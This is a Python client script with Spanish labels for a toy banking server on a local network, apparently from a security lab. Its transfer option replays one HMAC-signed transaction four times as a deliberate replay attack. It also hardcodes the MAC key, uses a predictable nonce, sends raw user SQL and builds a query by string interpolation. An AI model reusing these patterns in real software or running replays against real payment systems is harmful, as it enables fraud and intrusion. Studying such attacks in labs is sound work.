import socket
import hmac
import time
from rich import print

SHARED_KEY = b"clave_segura_para_mac_2025"

def generar_mac(mensaje: str) -> str:
    return hmac.new(SHARED_KEY, mensaje.encode(), "sha256").hexdigest()

def main():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(('192.168.1.135', 8000))
    print("🔐 Conectado al servidor [green]seguro[/green]")

    logged_in = False
    logged_username = None

    while True:
        print("[blink][bold yellow]\n--- MENÚ SEGURO ---[/bold yellow][/blink]")
        if not logged_in:
            print("1. Registrar usuario")
            print("2. Iniciar sesión")
            print("3. Salir")
        else:
            print("1. Realizar transacción")
            print("2. Ejecutar consulta SQL")
            print("3. Ver mi número de cuenta")
            print("4. Eliminar usuario")            
            print("5. Cerrar sesión")

        opcion = input("Elige una opción: ")

        if not logged_in:
            if opcion == "1":
                n = input("Nombre: ")
                p = input("Apellido: ")
                u = input("Usuario: ")
                pwd = input("Contraseña: ")
                msg = f"1,{n},{p},{u},{pwd}"
                client_socket.sendall(msg.encode())
                print(f"📩 Respuesta: {client_socket.recv(1024).decode()}")
            elif opcion == "2":
                u = input("Usuario: ")
                pwd = input("Contraseña: ")
                msg = f"2,{u},{pwd}"
                client_socket.sendall(msg.encode())
                response = client_socket.recv(1024).decode()
                if "exitoso" in response:
                    logged_in = True
                    logged_username = u
                    print(f"🔐 Has iniciado sesión como [bold blue]{u}[/bold blue]")
                print(f"📩 Respuesta: {response}")
            elif opcion == "3":
                break
        else:
            if opcion == "1":
                cuenta = input("Cuenta destino: ")
                try:
                    cantidad = float(input("Cantidad: "))
                    nonce = f"n{hash(logged_username + cuenta) % 100000}"
                    mensaje = f"{logged_username},{cuenta},{cantidad},{nonce}"
                    mac = generar_mac(mensaje)
                    msg = f"4,{mensaje},{mac}"
                    
                    # Envío inicial de la transacción
                    print(f"🔓 [bold red]ATAQUE REPLAY INICIADO[/bold red] - Enviando transacción original...")
                    client_socket.sendall(msg.encode())
                    response = client_socket.recv(1024).decode()
                    print(f"📩 Respuesta original: {response}")
                    
                    # Ataque de replay: enviar la misma transacción 3 veces más
                    for i in range(1, 4):
                        print(f"⏰ Esperando 5 segundos antes del replay #{i}...")
                        time.sleep(5)
                        print(f"🔄 [bold red]REPLAY #{i}[/bold red] - Reenviando la misma transacción...")
                        client_socket.sendall(msg.encode())  # Mismo mensaje exacto
                        replay_response = client_socket.recv(1024).decode()
                        print(f"📩 Respuesta replay #{i}: {replay_response}")
                    
                    print(f"🏁 [bold red]ATAQUE REPLAY COMPLETADO[/bold red] - Se enviaron 4 transacciones idénticas en total")
                        
                except:
                    print("❌ Cantidad no válida.")

            elif opcion == "2":
                query = input("Escribe la consulta SQL: ")
                client_socket.sendall(query.encode())
                response = client_socket.recv(4096).decode()
                print("📩 Resultado:", response)

            elif opcion == "3":
                query = f"SELECT numero_cuenta FROM usuarios WHERE usuarioName = '{logged_username}'"
                client_socket.sendall(query.encode())
                response = client_socket.recv(1024).decode()
                if "[" in response:
                    cuenta = response.strip("[]'").replace("'", "").split(",")[0].strip()
                    print(f"🏦 Tu cuenta: [green]{cuenta}[/green]")

            elif opcion == "4":
                pwd = input("Contraseña: ")
                msg = f"3,{logged_username},{pwd}"
                client_socket.sendall(msg.encode())
                response = client_socket.recv(1024).decode()
                print(f"📩 Respuesta: {response}")
                if "eliminado" in response:
                    logged_in = False
                    logged_username = None

            elif opcion == "5":
                logged_in = False
                logged_username = None
                print("✅ Cerraste sesión.")
            else:
                print("❌ Opción no válida")

    client_socket.close()
    print("🔌 Cliente desconectado")

if __name__ == "__main__":
    main()
